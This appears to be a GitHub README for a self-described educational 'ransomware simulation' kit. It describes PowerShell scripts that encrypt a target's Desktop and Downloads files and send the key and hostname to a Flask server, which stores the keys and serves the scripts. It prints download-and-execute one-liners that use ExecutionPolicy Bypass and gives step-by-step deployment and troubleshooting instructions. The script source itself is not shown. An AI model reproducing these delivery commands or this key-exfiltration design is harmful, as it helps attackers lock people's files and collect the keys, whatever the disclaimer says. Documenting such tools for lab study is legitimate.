# **Ransomware Simulation Scripts**

**⚠️ IMPORTANT NOTICE: THIS PROJECT IS PURELY FOR EDUCATIONAL PURPOSES ONLY. IT SIMULATES A RANSOMWARE-LIKE ENCRYPTION AND DECRYPTION PROCESS TO HELP USERS UNDERSTAND ENCRYPTION, DECRYPTION, AND SECURE COMMUNICATION. DO NOT USE THIS PROJECT MALICIOUSLY OR WITHOUT PROPER AUTHORIZATION. THE AUTHORS ARE NOT RESPONSIBLE FOR ANY MISUSE OF THIS SOFTWARE. ⚠️**


> this only works on Windows Machine. traffic is unencrypted.
---

## **Overview**

The project consists of the following components:

1. **`encryptor.ps1`**:
   - Encrypts files in specified folders (e.g., Desktop, Downloads).
   - Renames encrypted files with a `.secured` extension.
   - Sends the encryption key and system hostname to the server.

2. **`decryptor.ps1`**:
   - Decrypts files with the `.secured` extension.
   - Restores the original file names.

3. **`server.py`**:
   - Acts as a central server to store encryption keys and hostnames.
   - Serves the `encryptor.ps1` and `decryptor.ps1` scripts via HTTP.
   - Displays a webpage with one-liner commands for encryption and decryption.

4. **`codegen.py`**:
   - Dynamically generates the `encryptor.ps1` and `decryptor.ps1` scripts.
   - Embeds the server's IP address into the scripts.

---

## **Prerequisites**

### **1. Python Environment**
- Install Python 3.6 or higher.
- Install required Python libraries:
  ```bash
  pip install flask
  ```

### **2. PowerShell**
- Ensure PowerShell is installed on the target machine.
- Run PowerShell as an Administrator to avoid permission issues.

### **3. Network Setup**
- Ensure the server machine and client machines are on the same network.
- Allow communication on the server's port (default: `8000`).

---

## **Setup Instructions**

### **Step 1: Generate Scripts**
Run the `codegen.py` script to generate the `encryptor.ps1` and `decryptor.ps1` scripts:
```bash
python codegen.py
```
- By default, the script detects the server's IP address automatically.
- Alternatively, specify the server's IP manually:
  ```bash
  python codegen.py --ip <SERVER_IP>
  ```

### **Step 2: Start the Server**
Run the `server.py` script to start the server:
```bash
python server.py
```
- The server will display its IP address and port (e.g., `http://192.168.0.104:8000`).
- Access the server's IP in a browser to view the webpage with one-liner commands.

### **Step 3: Deploy Scripts**
- Place the generated `encryptor.ps1` and `decryptor.ps1` scripts in the parent directory of the server script.
- Ensure the server can serve these files when accessed via HTTP.

---

## **Usage Instructions**

### **1. Encryption**
Run the `encryptor.ps1` script on the target machine:
```powershell
powershell -ExecutionPolicy Bypass -File .\encryptor.ps1
```
- The script will:
  - Encrypt files in the specified folders (e.g., Desktop, Downloads).
  - Rename encrypted files with a `.secured` extension.
  - Send the encryption key and system hostname to the server.

### **2. Decryption**
Run the `decryptor.ps1` script on the target machine:
```powershell
powershell -ExecutionPolicy Bypass -File .\decryptor.ps1
```
- The script will:
  - Decrypt files with the `.secured` extension.
  - Restore the original file names.

### **3. One-Liner Commands**
Access the server's IP in a browser (e.g., `http://192.168.0.104:8000`) to view one-liner commands for encryption and decryption.

#### Example One-Liner for Encryption:
```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://192.168.0.104:8000/script/encryptor.ps1 -OutFile encryptor.ps1; .\encryptor.ps1"
```

#### Example One-Liner for Decryption:
```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://192.168.0.104:8000/script/decryptor.ps1 -OutFile decryptor.ps1; .\decryptor.ps1"
```

---

## **Server Features**

### **1. Webpage**
When you access the server's IP in a browser, you will see:
- One-liner commands for encryption and decryption.
- Statistics on the number of secured systems.

### **2. Key Storage**
The server stores encryption keys and hostnames in a file named `encryption_keys.txt`.

### **3. File Serving**
The server serves the `encryptor.ps1` and `decryptor.ps1` scripts via HTTP.

---

## **Troubleshooting**

### **1. Script Fails to Run**
- Ensure PowerShell is running with elevated privileges (as Administrator).
- Check the `encryption_log.txt` file for detailed error messages.

### **2. Files Not Encrypted**
- Verify that the files are accessible and not locked by another process.
- Ensure the script skips already encrypted files (`.secured` extension).

### **3. Server Not Accessible**
- Check the server's IP address and port.
- Ensure the firewall allows incoming connections on port `8000`.

### **4. Missing Dependencies**
- Install any missing Python libraries using `pip install <library_name>`.

---

## **Disclaimer**

This project is intended for educational purposes only. It simulates a ransomware-like behavior to help users understand encryption, decryption, and secure communication. Do not use this project maliciously or without proper authorization. The authors are not responsible for any misuse of this software.

---

<iframe width="560" height="315" src="https://www.youtube.com/embed/R0nV2_K4ncE?si=ocwBBK9pmfAovdiW" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

## **Contact**

For questions or feedback, please contact:
- X :[ x/anir0y](https://x.com/anir0y)
- GitHub: [github/anir0y](https://github.com/anir0y/)
